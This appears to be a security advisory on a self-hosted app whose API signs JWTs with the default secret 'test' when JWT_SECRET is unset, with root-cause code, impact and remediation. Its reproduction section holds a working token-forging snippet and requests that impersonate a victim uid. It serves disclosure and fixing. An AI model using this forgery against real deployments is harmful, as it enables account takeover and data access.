2. Summary

Official self-hosted installation leaves JWT_SECRET empty. The API then signs and verifies JWTs with the literal string test. The auth guard does not load the user from the database. An attacker who knows a victim uid can mint a valid access token and call authenticated APIs as that user.

The official self-host documentation never requires operators to set JWT_SECRET. The shipped env.example contains JWT_SECRET= with no warning.

3. Root Cause

File: apps/api/src/modules/config/app.config.ts

jwt: {
  secret: process.env.JWT_SECRET || 'test',
  expiresIn: process.env.JWT_EXPIRATION_TIME || '1d',
  refreshExpiresIn: process.env.JWT_REFRESH_EXPIRATION_TIME || '14d',
},

An empty environment variable is falsy, so the runtime secret becomes test.

File: apps/api/src/modules/auth/guard/jwt-auth.guard.ts

The guard verifies the token with auth.jwt.secret and sets request.user = payload. There is no database lookup and no check that the uid still exists.

File: apps/api/src/modules/auth/auth.service.ts

Access tokens are signed as { uid, email } only.

File: deploy/docker/env.example

JWT_SECRET=

File: docs/community-version/self-deploy/index.md

The guide says only “Edit .env with required settings”. It never names JWT_SECRET. The same env.example documents how to generate ENCRYPTION_KEY.

4. Impact

On a default official Docker or self-host install:

1. An unauthenticated attacker can forge HS256 access tokens using the secret test.
2. If a real uid is known, the attacker can invoke any JwtAuthGuard endpoint as that user, including profile, canvases, drive files, and provider configuration.
3. uid is not enumerable. Without a separate uid leak, this is a hard-coded credential issue, not unauthenticated mass account takeover.
4. Surfaces that may expose uid when content exists include GET /v1/template/list (DTO includes uid), public share JSON (owner.uid), and GET /v1/canvas/data?canvasId= (ownership check is optional in code).

5. Reproduction

Environment:

• Official compose: cd deploy/docker && cp env.example .env && docker compose up -d
• JWT_SECRET is unset
• Base URL: http://localhost:5700

5.1 Create a victim account

POST /api/v1/auth/email/signup
Content-Type: application/json

{"email":"victim@example.local","password":"VictimPass123!"}

Read Set-Cookie: _rf_uid=u-..., or decode the payload of _rf_access. This is how the product itself emits uid after signup. A real attack requires a different leak.

5.2 Negative control

Sign a token with a wrong secret and send:

GET /api/v1/user/me
Authorization: Bearer <token signed with "wrong-secret">

Expected: 401 Unauthorized.

5.3 Forge a token as the victim (no password)

const jwt = require("jsonwebtoken");
const token = jwt.sign(
  { uid: "<victim uid from 5.1>", email: "victim@example.local" },
  "test"
);

GET /api/v1/user/me
Authorization: Bearer <token from this step>

Expected: 200, body contains the victim uid and email.

5.4 Confirm account data, not only payload echo

GET /api/v1/user/settings
Authorization: Bearer <forged token>

GET /api/v1/canvas/list
Authorization: Bearer <forged token>

Expected: victim account data. A token for a non-existent uid must not be treated as successful takeover.

5.5 Control with a real secret

Set JWT_SECRET to a long random value, recreate the API container, and repeat 5.3. Expected: 401.

6. Remediation

1. Do not default to test. Refuse to start if JWT_SECRET is missing or shorter than 32 bytes.
2. Document JWT_SECRET as required in the self-host guide and in env.example.
3. After signature verification, load the user from the database and reject unknown uid values.
4. Rotate the secret and invalidate existing tokens on upgrade.

